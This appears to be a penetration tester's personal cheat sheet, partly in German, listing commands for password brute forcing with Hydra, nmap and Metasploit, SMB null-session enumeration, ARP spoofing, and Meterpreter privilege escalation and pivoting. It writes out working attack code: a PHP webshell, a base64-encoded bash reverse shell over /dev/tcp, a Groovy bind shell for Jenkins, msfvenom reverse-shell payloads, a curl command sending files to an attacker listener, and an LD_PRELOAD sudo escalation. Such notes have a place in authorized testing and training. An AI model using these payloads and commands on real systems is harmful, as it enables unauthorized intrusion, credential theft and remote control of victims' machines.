https://wiki.skullsecurity.org/index.php/Passwords

THC Hydra:
> -L    // list of usernames in file
> -P    // list of passwords in file
> -l    // list of usernames, separated via comma
> -p    // list of passwords, separated via comma
> -t    // Tasks per host
> -U    // Service moduledetails
> -M    // multible Hosts to attack

Crack HTTP form:
> Login Form:
  > look for method: GET or POST
  > look for name parameter
  
http-post-form:
> hydra -U http-post-form
> hydra <URL> <service http-post-form> 
  <login page "/login.php">:<user parameter "usr=">^USER^&<pass parameter "pass">^PASS^:<failed string - invalid credentials> -P <password list> -f <stop when creds found> -V   
> hydra <ip> ssh -L <user file> -P <password file>

nmap ssh-brute:
> nmap -p 22 --script ssh-brute --script-args userdb=user.txt,/usr/share/nmap/nselib/data/passwords.lst <target>

msfconsole ssh brute force:
> msfconsole -q
> use auxiliary/scanner/ssh/ssh_login
> set rhosts
> set username
> set pass_file
> set verbose true
> set stop_on_success true
> stop_on_success => true
> run

Windows Shares:
------------------
NetBIOS:
> used to view network shares on the local area network
> provides information:
  > Hostname
  > NetBIOS Name
  > Domain
  > Network Shares
> Ports:
  > NetBIOS NameauflÃ¶sung - UDP 137
  > Datagram Service      - UDP 138
  > Session Service       - TCP 139
  > ab Win ME: NBT        - TCP 445
> Universal Naming Convention paths:
  > \\Servername\ShareName\file.nat
> administrive shares:
  > \\Computername\C$       // volume on local machine
  > \\Computername\admin$   // install directory
  > \\Computername\ipc$     // inter-process communication
  
  
  
Null Session:
------------------
https://www.samba.org/
> can steal:
  > Passwords
  > System groups
  > System users
  > Running system processes
> nowadays configured to be immune, but legacy hosts can still be vulnerable
> login without any authentication

> Windows tool nbtstat:
  > nbtstat -A <IP>
    > <00> = workstation
    > WORKGROUP Name
    > <20> = file share is up and running
  > NET VIEW <IP>
    > Share Names with type Disk

> Linux tool nmblookup:
  > nmblookup -A <IP>
  > smbclient -L //<IP> -N              // L look for available services, N forces to use no password
    > show hidden admistrative shares, not like nbtstat
    > File and Printer Shares are interesting
  > Exploit the $IPC administrative share with Null Session
    Windows:
    > NET USE \\<IP>\IPC$ '' /u:''
    Linux:
    > smbclient //<IP>/IPC$ -N
    > enum4linux <ip>
      -U <IP>      // Users
      -S <IP>      // Shares
      -P <IP>      // Password Policy
      -n           // nbtstat like windows
      -s           // test shares (wordlist !!! CRACK THOSE HIDDEN USERS !!!)
    > samrdump.py
    /usr/share/doc/python3-impacket/examples/samrdump.py
      > samrdump.py <IP>
  > !!! every share must be tested separately !!!
    Enum Tool for Windows:
    https://packetstormsecurity.com/search/?q=win32+enum&s=files
    > enum -S <IP>      // Shares
    > enum -U <IP>      // Users
    > enum -P <IP>      // Password Policy
    https://packetstormsecurity.com/search/?q=winfo&s=files
    > winfo <IP> -n     // test Null Session
    
  > nmap Scan for Windows Shares:
    > -sS -p 135,139,445
    > --script=smb-enum-shares
    > --script=smb-enum-users
    > --script=smb-brute
    
  > smbmap
    > -H <IP>
    > -P Port (445)
    > -u "user" -p "pass"
    
    
    
ARP Poisoning:
------------------
arpspoof:
  > echo 1 > /proc/sys/net/ipv4/ip_forward
  > arpspoof -i <interface> -t <target> -r <host>
  > Wireshark Mitschnitt



MSFConsole:
------------------
> msfupdate
> service postgresql start
> msfconsole
> use arp_sweep
  > set RHOSTS <IP/Range_CIDR>
  > run
  > search portscan
> db_nmap [...]
  --script=smb-check-vulns.nse
  > !!! allways check versions of application for vulns !!!
http://www.metasploit.com/
  > show -h                                     // list all parameters
  > search <string>                             // search for module in metasploit
  > search <string 1> <string 2> <string n>     // gives back foundings of all strings
  > use <path to exploit>
  > back                                        // goes out of the module
  > info                                        // provides info for the module selected
  > show options                                // show options, which can be set
  > set <eg RHOST>                              // set value for the module selected
  
  > show payloads
  > set payload <path to payload module>
  > set <eg LPORT>
  > exploit
  
  > sysinfo
  > getuid
  > ifconfig
  > route
  > getsystem
  > ps
  > getpid
  
  > run post/windows/gather/win_privs
  > search bypassuac
  > exploit
  > getuid
  > run post/windows/gather/win_privs
  > getsystem
  > ps -U SYSTEM
  > migrate <PID> 
  
  > autoroute:
    > in meterpreter shell:
      > run autoroute -s <IP of new Subnet> -n <Subnet Mask>  
  > portfwd 
    > portfwd add -l <listening port> -p <remote port> -r <target ip>
    > scan localhost <listening port> to scan the target port
    > use modules again with remote ip and original port
  > socks_proxy
    > use auxiliary/server/socks_proxy
    > set VERSION 4a
    > set SRVPORT 9050
    > run -j
    > proxychains nmap -sT -P0 <target ip>
  
  > search hashdump
  
  > upload / downlaod       // '\' Characters must be escaped -> eg 'C:\\Windows'

  > shell                   // interactive shell
  
  
Meterpreter:
------------------
http://www.monkey.org/~dugsong/dsniff/
> all possible Meterpreter payloads: search meterpreter
> set payload [...]/meterpreter/[...]
> bind shell:     process on server waits for connections of attacker
> reverse shell:  connects back to the attacker -> firewall rule evasion


Remote Code Execution:
------------------
Blind Remote Code Execution
> ?cmd=sleep+1
> capture icmp    // ping+<ip>+-c+5
> curl http://<ip>:<port>/`whoami`
> curl http://<ip>:<port>/file -T /etc/issue      // PUT File in HTTP to the attacker listener

> File Upload from attacker machine:
  > python -m SimpleHTTPServer <port> on attacker machine
  > msfvenom -p linux/x64/shell_reverse_tcp lhost= lport= -f elf -o data
  > curl http://<ip>:<port>/data -o /tmp/r
  > chmod +x [...]
  > bash -i             // interactive shell
  > python -c 'import pty;pty.spawn("/bin/bash")'


Shells:
------------------
https://rosettacode.org/wiki/Execude_a_system_command
https://pentestmonkey.net/
> webshell
  > php
    > <html>
      <?php
      
      echo "<form method=GET><input type=text name=cmd><input type=submit value=ok></form>";
      system($_GET["cmd"]);
      
      ?>
      </html>
      
 > encode shells with base64:
  > echo 'bash -c "bash -i >& /dev/tcp/<local ipv4>/4444 0>&1"' | base64
  > nc -lvnp 4444
  > python reverse shell:
    > __import__("os").system("echo <output of base64 encoding> | base64 -d | bash")

> groovy bind-shell for jenkins script-console:
https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell
  int port=5555;
  String cmd="/bin/bash";
  Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
  Socket s = new java.net.ServerSocket(port).accept()
  InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
  OutputStream po=p.getOutputStream(),so=s.getOutputStream();
  while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
  > proxychains nc -v 192.108.156.3 5555

> post/multi/manage/shell_to_meterpreter

> search for history bash files in msfconsole:
  > gather session to victim
  > use post/linux/gather/enum_users_history
    > set session <session ID>
  > run
  
> mysql remote shell via msfconsole:
  > gather user and pass for login
  > use exploit/multi/mysql/mysql_udf_payload
  > set FORCE_UDF_UPLOAD true
  > set PASSWORD <Password>
  > set RHOSTS <victim ip>
  > set TARGET 1
  > set LHOST <local ip>
  > exploit
  > session -i 2

> tomcat manager login brute force:
  > use auxiliary/scanner/http/tomcat_mgr_login
  > set stop_on_success true
  > set RHOSTS
  
> msfvenom war package for RCE in Tomcat:
  > msfvenom -p java/jsp_shell_reverse_tcp LHOST=<local ip> LPORT=443 -f war > shell.war
  
> env_keep+=LD_PRELOAD privilege escalation:
  https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
  at sudo LD_PRELOAD=/tmp/shell.so ... use the permitteded sudo command from sudo -l
